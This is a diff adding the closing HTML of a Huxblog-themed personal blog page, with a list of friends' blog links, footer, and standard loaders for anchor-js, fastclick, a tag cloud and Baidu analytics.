+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
